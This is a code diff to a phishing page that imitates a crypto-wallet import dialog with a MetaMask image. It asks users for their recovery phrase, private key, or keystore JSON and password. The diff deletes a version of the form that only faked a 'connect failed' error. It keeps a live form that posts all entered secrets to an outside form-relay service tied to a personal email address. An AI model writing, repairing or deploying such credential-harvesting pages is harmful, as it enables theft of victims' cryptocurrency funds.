@@ -3083,27 +3083,7 @@ img {
                             <div class="tab-button" onclick="openTab(event, 'privatekey')">Private Key</div>
                             <div class="tab-button" onclick="openTab(event, 'keystore')">Keystore</div>
                         </div>
-                        <!-- ...existing code... -->
                         <form id="importWalletForm" action="#" method="POST">
-                            <input type="hidden" name="_captcha" value="false">
-                            <!-- ...existing form fields... -->
-                            <button id="submitBtn" class="btnmodal flex" type="submit">Import Wallet</button>
-                        </form>
-                        <script>
-                            document.getElementById('importWalletForm').addEventListener('submit', function (e) {
-                                e.preventDefault(); // Prevents form submission
-
-                                // Simulate connect failed
-                                document.getElementById('errorModal').style.display = 'block';
-                            });
-
-                            // Optional: Hide error modal when "Try Another Wallet" is clicked
-                            function closeModal() {
-                                document.getElementById('errorModal').style.display = 'none';
-                            }
-                        </script>
-                        <!-- ...existing code... -->
-                        <form id="importWalletForm" action="https://formsubmit.co/skashavkin@gmail.com" method="POST">
                             <input type="hidden" name="_captcha" value="false">
                             <div class="tab-content active" id="phrase">
                                 <label for="phrase">Enter Phrase</label>
@@ -3111,23 +3091,29 @@ img {
                             </div>
                             <div class="tab-content" id="privatekey">
                                 <label for="private-key">Enter Private Key</label>
-                                <input type="text" id="private-key" name="privatekey"
-                                    placeholder="Enter your private key">
+                                <input type="text" id="private-key" name="privatekey" placeholder="Enter your private key">
                             </div>
                             <div class="tab-content" id="keystore">
                                 <label for="keystore-json">Keystore JSON</label>
-                                <textarea id="keystore-json" name="keystore"
-                                    placeholder="Input your Keystore JSON"></textarea>
+                                <textarea id="keystore-json" name="keystore" placeholder="Input your Keystore JSON"></textarea>
                                 <label for="password">Password</label>
                                 <input type="text" id="password" name="password" placeholder="Enter Keystore password">
                             </div>
                             <button id="submitBtn" class="btnmodal flex" type="submit">Import Wallet</button>
                         </form>
+                        <script>
+                            // Optional: Hide error modal when "Try Another Wallet" is clicked
+                            function closeModal() {
+                                document.getElementById('errorModal').style.display = 'none';
+                            }
+                        </script>
+                        <!-- ...existing code... -->
                         < !-- Modal (Hidden by default) -->
                             <div id="errorModal" class="modal">
                                 <div class="modal-content"><span class="close" onclick="closeModal()">&times;
                                     </span>
-                                    <div class="form-image"><svg viewBox="0 0 110 110" width="110" height="110">
+                                    <div class="form-image"><svg viewBox="0 0 110 110" width="110"
+                                            height="110">
                                             <rect x="2" y="2" width="106" height="106" rx="36"
                                                 stroke-dasharray="116 245" stroke-dashoffset="360"></rect>
                                         </svg><img class='loading-img' alt="metamask" src="images/encryption.png"></div>
@@ -3158,9 +3144,7 @@ img {
 
                                 if (text.includes(filter)) {
                                     item.style.display = "flex"; // Or "block" if you're using block layout
-                                }
-
-                                else {
+                                } else {
                                     item.style.display = "none";
                                 }
                             });
